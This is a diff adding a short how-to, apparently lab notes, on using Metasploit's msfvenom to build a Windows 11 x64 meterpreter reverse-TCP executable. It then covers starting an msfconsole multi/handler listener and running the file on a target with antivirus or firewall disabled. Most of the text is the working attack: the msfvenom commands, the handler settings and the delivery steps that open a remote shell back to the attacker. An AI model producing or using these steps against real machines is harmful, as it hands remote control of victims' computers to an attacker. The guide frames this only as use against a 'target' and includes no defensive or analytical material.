@@ -1,0 +1,40 @@
+Metasploit (We use these steps for Windows x64)
+Building a payload for Windows 11 using msfvenom in Kali Linux involves generating an executable that, when run on the target, connects back to your machine. 
+-------------------------------------------------------------------------------------------------------------------------
+Generate the Payload (Kali Terminal) 
+Use msfvenom to create a reverse TCP meterpreter payload. Replace 192.168.1.3 with your actual Kali Local IP address (use ifconfig to check). 
+
+Bash (kali Terminal)
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.3 LPORT=4444 -f exe -o windows11_payload.exe
+
+or…. (But here without Encoder)...
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.4 LPORT=44444 -f exe -o  /home/kali/Desktop/shell.exe
+
+    • -p: Specifies the payload (windows/x64/meterpreter/reverse_tcp for 64-bit Windows 11).
+    
+    • LHOST: Your Kali Linux IP address.
+    • LPORT: The port you will listen on.
+    • -f: File format (exe).
+    • -o: Output filename. 
+      -----------------------------------------------------------------------------------------------------------------------------------------------------------------
+Step 2: Start the Listener : (msfconsole) 
+    1. Open msfconsole:
+       bash (kali Terminal)
+       msfconsole
+    2. Set up the handler to receive the connection:
+       bash
+       use exploit/multi/handler
+       set payload windows/x64/meterpreter/reverse_tcp
+       set LHOST 192.168.1.3  # Must match LHOST in Step 1 (set your Ip for your Local Machine)
+       set LPORT 4444         # Must match LPORT in Step 1 (This is the port that not be used on your Local Machine)
+       run or  exploit 
+       -----------------------------------------------------------------------------------------------------------------------------------
+Step 3: Execute on Target (close your firewall or Antivirus in real-time)
+    1. Transfer windows11_payload.exe to the target Windows 11 machine.
+    2. Run the executable (windows11_payload.exe) on the Windows 11 machine.
+    3. The msfconsole on your Kali machine will show a meterpreter session opened (use help as command, you could see all the options). 
+
+
+
